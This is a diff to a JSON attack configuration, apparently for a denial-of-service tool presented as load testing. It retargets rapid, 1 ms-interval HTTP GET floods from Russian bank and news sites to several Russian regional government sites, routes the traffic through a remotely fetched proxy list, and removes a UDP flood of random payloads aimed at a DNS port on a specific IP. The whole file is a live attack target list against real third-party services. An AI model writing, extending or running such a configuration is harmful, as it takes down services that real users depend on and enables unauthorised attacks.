@@ -14,9 +14,10 @@
     },
     {
       "type": "http",
+      "count": 5,
       "args": {
         "method": "GET",
-        "path": "https://my.bank-hlynov.ru:443/",
+        "path": "https://www.tula.ru:443/",
         "interval_ms": 1,
         "client": {
           "async": true,
@@ -26,9 +27,10 @@
     },
     {
       "type": "http",
+      "count": 5,
       "args": {
         "method": "GET",
-        "path": "https://link.centrinvest.ru:443/",
+        "path": "https://orel-region.ru:443/",
         "interval_ms": 1,
         "client": {
           "async": true,
@@ -38,10 +40,23 @@
     },
     {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "method": "GET",
-        "path": "https://regnum.ru:443/",
+        "path": "https://www.volgograd.ru:443/",
+        "interval_ms": 1,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/proxylist.json\" }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "count": 5,
+      "args": {
+        "method": "GET",
+        "path": "https://www.astrobl.ru:443/",
         "interval_ms": 1,
         "client": {
           "async": true,
@@ -73,14 +88,6 @@
           "async": true,
           "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/proxylist.json\" }}"
         }
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "178.248.236.20:53",
-        "interval_ms": 5,
-        "body": "{{ random_payload 128 }}"
       }
     }
   ]
